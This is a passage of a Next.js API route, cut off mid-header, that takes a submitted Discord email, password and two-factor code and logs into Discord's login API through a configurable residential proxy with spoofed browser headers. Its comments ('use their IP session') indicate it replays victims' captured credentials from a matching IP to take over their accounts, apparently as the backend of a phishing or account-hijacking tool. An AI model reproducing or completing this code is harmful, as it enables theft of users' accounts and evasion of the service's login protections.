import { NextRequest, NextResponse } from 'next/server';
import { HttpsProxyAgent } from 'https-proxy-agent';

export async function POST(req: NextRequest) {
  const { email, password, code, proxy } = await req.json();
  
  try {
    // Use their IP session to create proxy connection
    // You need proxy list - residential proxies work best
    const proxyUrl = `http://${proxy}:8080`; // Configure your proxy pool
    
    const agent = new HttpsProxyAgent(proxyUrl);
    
    // Login to Discord
    const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmR
